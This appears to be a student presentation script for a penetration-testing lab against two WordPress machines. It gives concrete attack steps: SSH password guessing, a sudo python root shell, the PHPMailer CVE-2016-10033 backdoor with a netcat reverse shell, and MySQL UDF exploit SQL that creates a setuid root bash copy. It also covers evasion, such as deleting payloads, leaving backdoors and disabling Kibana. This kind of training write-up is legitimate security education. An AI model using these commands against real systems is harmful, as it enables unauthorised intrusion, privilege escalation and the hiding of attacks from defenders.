executing# SCRIPT

*SLIDE 1*

## *Jamie* - Introduction and Scenario (Slides 1-4)
* **whoami**
* **Scenario**
  - We are Ethical Hackers hired by Raven Security to break into their Network to see if we can corpomise their systems.
  - We have access to the network, and we are on a `Kali Linux Machine`

## *Spike* - Recon and enumeration for Target 1 (Slides 5-7)
  - We find two WordPress servers that are hosting the Raven Security's WordPress
      * OS: Some distro of linux
      * The open ports are `22 (ssh)` , `80 Apache httpd`,  `139 & 445 netbios-ssn`
  - There is a second WordPress server, but let's focus one for now
  - Because we know that it's a WordPress site, we can use a tool called WordPress scan (WP scan) to enumerate a set dictionary of common or default WordPress directories and users. we can see:
      * wordpress/readme.html
      * wordpress/xmlrpc.php
      * two users, `Michael` & `Steven`


##  *Jesse* - MySQL & Privilege Escalation (Slides 8-11)

##### MySQL
  - Now that we know possible users on the machine, and that we can SSH into the machine with only needing a password, we can try a few different combinations to see if anything worked
  - `ssh michael@192.168.1.110` `password: michael` works. which gives us a normal users access to the machine, which doesn't lock us out of `/var/www/` where the WordPress server is stored
  - What else is stored there? the MySQL database credentials.
  - `stevens password hash` was stored in the MySQL Database, exporting that hash to my local machine and using john on it
  - The hash `$P$BK3VD9jsxx/loJOqNsURgHiaB23j7W/`, is a WordPress hash that's implemented from the `Portable PHP password hashing framework`
  - Brute forcing the hash gets us the password `pink84`, swapping users with `su - steven` `password: pink84`


##### *Privilege Escalation - The Python way*
  - Steven has the ability to use the `python` with sudo . So we can use the Pseudo-terminal utilities (`pty`) to spawn a bash shell using python, here's the command: `sudo python -c 'import pty;pty.spawn("/bin/bash")'`
  - this spawns a root bash shell using python


##### *Privilege Escalation - Yea the password was just `toor`*
  - This is another case of bad password management, this was the first guess and to get it so easily is a huge disappointment




## *Sean* - Target 2 Enumeration and Research (Slides 12-16)


* **Enumeration**
  * This is another WordPress server
      * The OS is Linux
      * The open ports are `22 ssh`, `80 Apache http`, `111 rpcbind`, `139 and 445 Samba smbd`


  * GOBUSTER
      * using a set dictionary by called `seclists` by Daniel Miessler, we can enumerate other directories that may give us access to files on the server
      * `wordpress` `vendor`
  * WPSCAN
      * Our friends `michael` and `steven` are back, but their passwords are changed.
</br>
</br>
The first step in any pentest is to do some recon, we do this by using nmap to `enumerate` the target system, after seeing that `port 22` and `port 80` is open, we can enumerate the apache server to try to get a list of directories, we can use `gobuster` `dirbuster` or any other tool, to see that this is a WordPress site. We can then use `WordPress SCAN (wpscan)` to enumerate with a list of common WordPress directories and users to gain information about the website.
</br>
</br>

* **CVE-2016-10033**
</br>
     * going to `http://192.168.1.115/vendor`, we can see the companies vulnerability concern in their system, that they plan to patch `CVE-2016-10033`
     * This vulnerability is for the `PHPMailer` for versions before 5.2.18 that might allow remote attackers to passe extra parameters to the mail command and consequently execute code.

</br>
</br>
</br>
In the results of the enumeration, we can see that there is a `/vendor` directory, that holds a lot of information, such as security reports they're keeping track of, the version number of their `PHPMailer`, andd so much more!

Using the information we gained from the website we came to the conclusion that this system is vulnerable to `CVE-2016-10033`,  we can exploit this by using either the python script on `exploit-db` or the provided script that was provided for this lab, the script will be demonstrated in this presentation.


</br>
</br>

* **Reverse Shell**
     * we use `CVE-2016-10033` to get a `nc` listener to our kali machine on `port 4444`, then use python to gain a bash shell using `python -c 'import pty;pty.spawn("/bin/bash")'
`

After editing and executing the provided script to include the target IP in the URL, we back to the website to see that /backdoor.php was created and can execute code as a normal user, we exploit this by opening a `netcat` connection
to open, but the shell is unstable.

Luckily, since `Python` is installed on the system, we can run the python code to gain a stable shell running on python `python -c 'import pty;pty.spawn("/bin/bash")'`  and boom! we have a stable bash shell!


* **Access to MySQL**
     * The MySQL credentials are in the same place and are the same





## *Briggs* - Target 2 Escalation (Slides 17-24)
</br>


<details>
<summary>Click here for the written script, instead of just bullet points</summary>
</br>

*So what can we do with a user shell? Well not much, we can't make scripts, we don't have sudo access or any root access to any files. we can deface the website, and find the credentials to the MySQL server, but if we want to do serious harm, we're going to want root access.*

*To gain root access, we need to see what is running or can be ran as root to take advantage of that, we can use the command `ps aux | grep -i "root"`, we see that `MySQL` is running at root, and we do have the credentials to access it.*

*Log-in in, we can see the version number being 5.5, it being deep in its 5.0 version environment, I decided to look for exploits that worked with all versions of 5 and some versions of 6, to narrow down rabbit holes to jump in.*

*MYSQL 4/5/6 - UDF for code execution is the only thing that pops up, and it's a see exploit. All of the guides on running this exploit use a C compiler called `gcc`.*
*Using `which GCC`, I was able to see that it was downloaded on the target machine, so I tried downloading the exploit and compiling it on the target machine, but there were a lot of problems that came*

*Testing that it compiled correctly on my host machine, giving me a payload with a ` .so ` extension,  I needed to transfer that file from my machine to the target machine. since both machines are on the same network, I can use python SimpleHTTPServer on my host machine to download it onto the target machine.*

  - Python Command: `python -m SimpleHTTPServer 80`
  - Target 2 Command: `wget 192.168.1.90/temp/1518.so`

*Now that this file is on the system, we can follow the guide to insert the file into the system and run whatever code we see fit.*

*we can copy a root user bash terminal by using the code execution as root, to copy `/bin/bash`, then use `chmod` to let non root users access the root terminal without passwords.*

*Using this terminal, we can go into /etc/shadow to crack the password hashes*

*Or we could have just skipped all of that because the system admin left `root`'s password as `toor`. *

</details>
</br>


* **Escalation Requirements**
  * Access to MySQL
  * MySQL to run as root
  * SQL Version


* **MySQL 4.x/5.0 (Linux) - User-Defined Function (UDF) Dynamic Library (2)**
  * This vulnerability [describe vulnerability], so we can use this to use code as a root user, since MySQL is running as root.


* **Python SimpleHTTPServer**
  * I tried really hard to get the exploit to compile on the target machine, but I couldn't do it. So I had to compile it on my host machine using this guide link to guide, then use Python to host a simple HTTP server on `port 80`, then use the target machine to download it with `wget`


* **Code injection to create a copy of the root shell that anyone can launch found in /tmp/**
  * using the same guide, it gives us a full tutorial on dig this exploit to create a copy of a shell that anyone can run that opens a root bash shell
   * `insert into foo values(load_file('/tmp/1518.so'));`
   * `select * from foo into dumpfile '.usr/lib/1518.so';`
   * `create function do_systems returns integer soname '1518.so';`
   * `select * from foo into dumpfile '/usr/lib/mysql/plugin/1518.so';`
   * `create function do_system returns integer soname 1518.so`
   * `select * from mysql.func`
  * and now we have the ability to run code as root through MySQL, the guide shows a method that allows us to copy /bin/bash as root, then chmod it so any user can run it, giving everyone access to root
  * `select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');`

 * **Or...just guess the root password...again...it's `toor`...**


* **Cracking `/etc/shadow` to get the passwords to the system**
  * Now that we have access to a root shell, we can go into `/etc/shadow` to crack the password hashes for all of the users, so we can start cleaning up and maybe leaving a backdoor


  ## *Sean* - Avoiding Detection  (Slide 25)
  * Avoiding Enumeration detection
      - a `SYN` packet is sent, looking for a `SYN/ACK` packet, but instead of sending an `ACK` packet back, it kills the connection early by sending a `RST` packet as soon as an `SYN/ACK` packet is found, and if no `SYN/ACK` packet gets sent pack, (or if certain ICMP errors are returned), then the port is filtered. If a `RST` packet is sent then the port is closed.


  * Cleaning up payloads
    - For Target 2, we uploaded a payload using a script associated with `CVE-2016-10033`, after gaining root access, deleting these would be important for cleaning up our tracks, including the payload done with the user-Defined Function (UDF) Dynamic Library Remote Code Execution

  * Disable Kibana
   - Disable Kibana by deleting all of its relative files on the system and by disabling connection to it in `iptables`


## *Jamie* - Conclusion (Slide 26)

  * Target 1
    - Target one was easy to compromise due to poor passwords put in place, easy enumeration, and stored credentials for the MySQL Database, and then gaining access to the root user exploiting `python` being allowed to run as `sudo`
  * Target 2
    - Target two was also easy to compromise due to being able to upload a backdoor, connect to it using their own website to gain a `netcat` reverse shell, then using MySQLs outdated version, and the fact it was running as `root` to upload another payload to make a copy of a root terminal that anyone can use without privileges
  * Avoiding Detection
    - We can use stealthy scans to generate less noise on the network
    - Cleaning up the payloads left on the machnine
    - Using different forms of disable kibana
Written by Briggs :) 
